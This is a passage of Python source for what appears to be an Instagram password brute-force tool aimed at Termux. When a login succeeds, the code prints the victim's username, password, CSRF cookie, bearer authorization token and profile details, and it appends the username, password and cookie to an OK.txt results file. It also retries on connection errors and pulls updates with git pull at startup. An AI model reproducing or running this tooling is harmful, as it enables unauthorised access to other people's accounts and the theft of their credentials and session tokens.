                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       else:
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
            except requests.exceptions.ConnectionError as e:
               time.sleep(10) ; self.api_vjs2(user, password, allData_akun, file='data/termux/internal/')
        self.lp +=1

class LicenseKey:
    
    def __init__(self, UserAgent = 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9890; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/8.0.0.261 Mobile Safari/534.11+') -> None:
        self.ses = requests.Session()
        self.dires = 'data/termux/internal'
        self.token = 'WyI4Mzc5NzYyMSIsInJxZm1XSmx6U2M2Q0xrZ1B4NjZoeWFUQWJCOUZJVjZRQUZCOWVKaWkiXQ=='
        self.ProductId = '25646'
        self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
        self.direk()
        self.ipp = self.ses.get("https://api.ipify.org/?format=json").json()["ip"]
    
    def clearTerminal(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass
    
    def Logou(self):
        prints(Panel(f'''{H2}_                   
| |     (_)                  
| |      _  ____ _   _  ____ 
| |     | |/ _  ) | | |/ ___)
| |_____| ( (/ /| |_| | |    
|_______)_|\____)\____|_| ''',width=56,padding=(0,9),style="turquoise2"))

    def direk(self):
        try:__import__('os').mkdir('data')
        except Exception as e : pass
        try:__import__('os').mkdir('data' +'/'+ 'termux')
        except Exception as e : pass
        try:__import__('os').mkdir('data' +'/'+ 'termux' +'/'+ 'internal')
        except Exception as e : pass

if __name__=='__main__':
  try:
      __import__('os').system('git pull') ; Brute().Menu()
  except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
     __import__('os').system('clear') ; LicenseKey().Logou() ; Console().print(f'\n {P2}[{M2}!{P2}] ConnectionError : {M2}{str(e).title()}') ; time.sleep(3.1) ; sys.exit()
